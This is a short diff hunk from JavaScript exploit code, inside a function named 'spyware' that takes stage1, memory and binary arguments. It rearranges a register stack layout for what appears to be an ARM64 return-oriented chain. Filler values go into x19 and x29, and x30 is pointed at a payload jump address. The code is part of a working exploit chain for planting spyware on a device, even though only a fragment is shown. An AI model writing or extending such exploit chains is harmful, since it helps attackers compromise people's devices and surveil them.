@@ -593,10 +593,10 @@ function spyware(stage1, memory, binary)
     arr[pos++] = 0xdead0077;                // x21
     arr[pos++] = 0xdead0078;                // x20
     arr[pos++] = 0xdead0079;                // x20
-    arr[pos++] = codeAddr.lo();             // x19
-    arr[pos++] = codeAddr.hi();             // x19
-    arr[pos++] = 0xdead007a;                // x29
-    arr[pos++] = 0xdead007b;                // x29
+    arr[pos++] = 0xdead007a;                // x19
+    arr[pos++] = 0xdead007b;                // x19
+    arr[pos++] = 0xdead007c;                // x29
+    arr[pos++] = 0xdead007d;                // x29
     arr[pos++] = jmpAddr.lo();              // x30 (payload)
     arr[pos++] = jmpAddr.hi();              // x30 (payload)
 
